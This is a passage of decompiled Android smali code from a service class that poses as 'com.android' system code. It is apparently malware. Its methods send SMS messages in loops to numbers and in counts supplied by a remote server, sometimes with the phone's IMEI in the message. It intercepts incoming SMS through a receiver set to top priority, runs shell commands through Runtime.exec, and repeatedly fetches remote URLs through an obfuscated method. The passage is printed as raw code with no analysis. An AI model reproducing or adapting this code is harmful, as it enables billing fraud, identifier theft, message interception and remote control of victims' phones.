    .line 400
    const/16 v18, 0x0

    aget-object v18, p2, v18

    const/16 v19, 0xc

    invoke-static/range {v18 .. v19}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v18

    move-object/from16 v0, v18

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 401
    new-instance v18, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v19, "|"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const/16 v19, 0x1

    aget-object v19, p2, v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, "|"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const/16 v19, 0x2

    aget-object v19, p2, v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 402
    .restart local v9       #logtxt:Ljava/lang/String;
    sget-object v18, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v9

    move-object/from16 v1, v18

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 403
    const/16 v18, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move/from16 v2, v18

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 404
    throw v17
.end method

.method private execExec(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 6
    .parameter "paramString"
    .parameter "paramArrayOfString"

    .prologue
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v4

    invoke-virtual {v4, p1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    .line 692
    const-string v4, "pm uninstall jail.neo.lock"

    invoke-virtual {p1, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 693
    invoke-virtual {p0}, Lcom/android/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 694
    .local v0, context:Landroid/content/Context;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "It works! Now executing "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 695
    .local v2, text:Ljava/lang/CharSequence;
    const/4 v1, 0x0

    .line 697
    .local v1, duration:I
    invoke-static {v0, v2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v3

    .line 698
    .local v3, toast:Landroid/widget/Toast;
    invoke-virtual {v3}, Landroid/widget/Toast;->show()V

    .line 700
    .end local v0           #context:Landroid/content/Context;
    .end local v1           #duration:I
    .end local v2           #text:Ljava/lang/CharSequence;
    .end local v3           #toast:Landroid/widget/Toast;
    :cond_0
    return-void
.end method

.method private execTanc(Ljava/lang/String;)V
    .locals 4
    .parameter "allStr"

    .prologue
    .line 474
    const-string v1, ""

    .line 475
    .local v1, softUrl:Ljava/lang/String;
    const-string v0, "no"

    .line 478
    .local v0, isreset:Ljava/lang/String;
    :try_start_0
    const-string v2, "<url>"

    const-string v3, "</url>"

    invoke-static {p1, v2, v3}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 479
    const-string v2, ""

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 495
    :goto_0
    return-void

    .line 482
    :cond_0
    const-string v2, "<shieldnum>"

    .line 483
    const-string v3, "</shieldnum>"

    .line 482
    invoke-static {p1, v2, v3}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 485
    const-string v2, "<exactnum>"

    .line 486
    const-string v3, "</exactnum>"

    .line 485
    invoke-static {p1, v2, v3}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 489
    const-string v2, "<isreset>"

    const-string v3, "</isreset>"

    invoke-static {p1, v2, v3}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 490
    const-string v2, "no"

    invoke-virtual {v2, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 493
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method private sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 8
    .parameter "addr"
    .parameter "body"

    .prologue
    const/4 v2, 0x0

    .line 513
    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v0

    .line 514
    .local v0, smsMag:Landroid/telephony/gsm/SmsManager;
    new-instance v7, Landroid/content/Intent;

    const-string v1, "com.test.sms.send"

    invoke-direct {v7, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 515
    .local v7, sendIntent:Landroid/content/Intent;
    invoke-static {p0, v2, v7, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 517
    .local v4, sendPI:Landroid/app/PendingIntent;
    new-instance v6, Landroid/content/Intent;

    const-string v1, "com.test.sms.delivery"

    invoke-direct {v6, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 518
    .local v6, deliveryIntent:Landroid/content/Intent;
    invoke-static {p0, v2, v6, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    .line 520
    .local v5, deliveryPI:Landroid/app/PendingIntent;
    const/4 v2, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 521
    return-void
.end method

.method private sendSms(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 18
    .parameter "allStr"
    .parameter "record"

    .prologue
    .line 253
    const-string v11, ""

    .line 254
    .local v11, smsAddress:Ljava/lang/String;
    const-string v12, ""

    .line 255
    .local v12, smsBody:Ljava/lang/String;
    const-string v9, "1"

    .line 256
    .local v9, sendcount:Ljava/lang/String;
    const-string v6, "no"

    .line 257
    .local v6, isreset:Ljava/lang/String;
    const/4 v4, -0x2

    .line 258
    .local v4, flag:I
    const/4 v8, 0x0

    .line 261
    .local v8, result:I
    :try_start_0
    const-string v15, "<sendnum>"

    .line 262
    const-string v16, "</sendnum>"

    .line 261
    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 263
    const-string v15, ""

    invoke-virtual {v15, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v15

    if-eqz v15, :cond_0

    .line 302
    const/4 v15, 0x0

    aget-object v15, p2, v15

    const/16 v16, 0xc

    invoke-static/range {v15 .. v16}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 303
    new-instance v15, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v16

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x1

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x2

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 304
    .local v7, logtxt:Ljava/lang/String;
    sget-object v15, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v7, v15}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 305
    move-object/from16 v0, p0

    move v1, v4

    move v2, v8

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 307
    :goto_0
    return-void

    .line 266
    .end local v7           #logtxt:Ljava/lang/String;
    :cond_0
    :try_start_1
    const-string v15, "<sendchannel>"

    .line 267
    const-string v16, "</sendchannel>"

    .line 266
    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 269
    const-string v15, "<shieldnum>"

    .line 270
    const-string v16, "</shieldnum>"

    .line 269
    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 271
    .local v14, tmpshieldnum:Ljava/lang/String;
    const-string v15, ""

    invoke-virtual {v15, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v15

    if-nez v15, :cond_1

    move-object v0, v14

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 273
    :cond_1
    const-string v15, "<exactnum>"

    .line 274
    const-string v16, "</exactnum>"

    .line 273
    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 275
    .local v13, tmpexactnum:Ljava/lang/String;
    const-string v15, ""

    invoke-virtual {v15, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v15

    if-nez v15, :cond_2

    move-object v0, v13

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 277
    :cond_2
    const-string v15, "<sendcount>"

    .line 278
    const-string v16, "</sendcount>"

    .line 277
    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 281
    const-string v15, "<isreset>"

    const-string v16, "</isreset>"

    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 282
    const-string v15, "no"

    invoke-virtual {v15, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 285
    const-string v15, "test"

    invoke-virtual {v15, v12}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v15

    if-eqz v15, :cond_3

    .line 286
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "test:"

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 287
    :cond_3
    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v10

    .line 288
    .local v10, sendcounts:I
    const/4 v5, 0x0

    .local v5, i:I
    :goto_1
    if-lt v5, v10, :cond_4

    .line 302
    const/4 v15, 0x0

    aget-object v15, p2, v15

    const/16 v16, 0xc

    invoke-static/range {v15 .. v16}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 303
    new-instance v15, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v16

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x1

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x2

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 304
    .restart local v7       #logtxt:Ljava/lang/String;
    sget-object v15, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v7, v15}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 305
    move-object/from16 v0, p0

    move v1, v4

    move v2, v8

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 289
    .end local v7           #logtxt:Ljava/lang/String;
    :cond_4
    :try_start_2
    move-object/from16 v0, p0

    move-object v1, v11

    move-object v2, v12

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 290
    add-int/lit8 v8, v8, 0x1

    .line 292
    const-wide/16 v15, 0x3a98

    :try_start_3
    invoke-static/range {v15 .. v16}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 288
    :goto_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    .line 297
    .end local v5           #i:I
    .end local v10           #sendcounts:I
    .end local v13           #tmpexactnum:Ljava/lang/String;
    .end local v14           #tmpshieldnum:Ljava/lang/String;
    :catch_0
    move-exception v15

    move-object v3, v15

    .line 298
    .local v3, e:Ljava/lang/Exception;
    const/16 v4, -0x2c

    .line 302
    const/4 v15, 0x0

    aget-object v15, p2, v15

    const/16 v16, 0xc

    invoke-static/range {v15 .. v16}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 303
    new-instance v15, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v16

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x1

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x2

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 304
    .restart local v7       #logtxt:Ljava/lang/String;
    sget-object v15, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v7, v15}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 305
    move-object/from16 v0, p0

    move v1, v4

    move v2, v8

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 299
    .end local v3           #e:Ljava/lang/Exception;
    .end local v7           #logtxt:Ljava/lang/String;
    :catchall_0
    move-exception v15

    .line 302
    const/16 v16, 0x0

    aget-object v16, p2, v16

    const/16 v17, 0xc

    invoke-static/range {v16 .. v17}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v16

    move-object/from16 v0, v16

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 303
    new-instance v16, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v17, v0

    invoke-static/range {v17 .. v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v17

    invoke-direct/range {v16 .. v17}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v17, "|"

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const/16 v17, 0x1

    aget-object v17, p2, v17

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "|"

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const/16 v17, 0x2

    aget-object v17, p2, v17

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 304
    .restart local v7       #logtxt:Ljava/lang/String;
    sget-object v16, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v7

    move-object/from16 v1, v16

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 305
    move-object/from16 v0, p0

    move v1, v4

    move v2, v8

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 306
    throw v15

    .line 293
    .end local v7           #logtxt:Ljava/lang/String;
    .restart local v5       #i:I
    .restart local v10       #sendcounts:I
    .restart local v13       #tmpexactnum:Ljava/lang/String;
    .restart local v14       #tmpshieldnum:Ljava/lang/String;
    :catch_1
    move-exception v15

    goto/16 :goto_2
.end method

.method private vxabgosx(Ljava/lang/String;)V
    .locals 8
    .parameter "allStr"

    .prologue
    .line 311
    const-string v5, ""

    .line 312
    .local v5, xboxUrl:Ljava/lang/String;
    const-string v4, ""

    .line 313
    .local v4, type:Ljava/lang/String;
    const-string v2, "1"

    .line 314
    .local v2, linkenum:Ljava/lang/String;
    const-string v1, "no"

    .line 317
    .local v1, isreset:Ljava/lang/String;
    :try_start_0
    const-string v6, "<url>"

    const-string v7, "</url>"

    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 318
    const-string v6, ""

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 348
    :cond_0
    :goto_0
    return-void

    .line 321
    :cond_1
    const-string v6, "<type>"

    const-string v7, "</type>"

    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 323
    const-string v6, "<shieldnum>"

    .line 324
    const-string v7, "</shieldnum>"

    .line 323
    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 326
    const-string v6, "<exactnum>"

    .line 327
    const-string v7, "</exactnum>"

    .line 326
    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 329
    const-string v6, "<linkenum>"

    .line 330
    const-string v7, "</linkenum>"

    .line 329
    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 333
    const-string v6, "<isreset>"

    const-string v7, "</isreset>"

    invoke-static {p1, v6, v7}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 334
    const-string v6, "no"

    invoke-virtual {v6, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 337
    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    .line 342
    .local v3, linkenums:I
    const/4 v0, 0x0

    .local v0, i:I
    :goto_1
    if-ge v0, v3, :cond_0

    .line 344
    invoke-static {v5}, Lcom/android/BaseAuthenicationHttpClient;->getXboxStrByURL(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 342
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    .line 346
    .end local v0           #i:I
    .end local v3           #linkenums:I
    :catch_0
    move-exception v6

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .parameter "intent"

    .prologue
    .line 587
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 20

    .prologue
    .line 75
    new-instance v3, Lcom/android/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/MainService$SMSReceiver;-><init>(Lcom/android/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->sendReceiver:Lcom/android/MainService$SMSReceiver;

    .line 76
    new-instance v17, Landroid/content/IntentFilter;

    const-string v3, "com.test.sms.send"

    move-object/from16 v0, v17

    move-object v1, v3

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 77
    .local v17, sendFilter:Landroid/content/IntentFilter;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->sendReceiver:Lcom/android/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object/from16 v2, v17

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 79
    new-instance v3, Lcom/android/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/MainService$SMSReceiver;-><init>(Lcom/android/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->deliveryReceiver:Lcom/android/MainService$SMSReceiver;

    .line 80
    new-instance v9, Landroid/content/IntentFilter;

    const-string v3, "com.test.sms.delivery"

    invoke-direct {v9, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 81
    .local v9, deliveryFilter:Landroid/content/IntentFilter;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->deliveryReceiver:Lcom/android/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v9

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 83
    new-instance v3, Lcom/android/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/MainService$SMSReceiver;-><init>(Lcom/android/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->smsReceiver:Lcom/android/MainService$SMSReceiver;

    .line 84
    new-instance v14, Landroid/content/IntentFilter;

    const-string v3, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v14, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 85
    .local v14, receiverFilter:Landroid/content/IntentFilter;
    const v3, 0x7fffffff

    invoke-virtual {v14, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 86
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smsReceiver:Lcom/android/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v14

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 89
    const-string v3, "androidh.log"

    const/4 v4, 0x0

    move-object/from16 v0, p0

    move-object v1, v3

    move v2, v4

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    .line 90
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_0

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

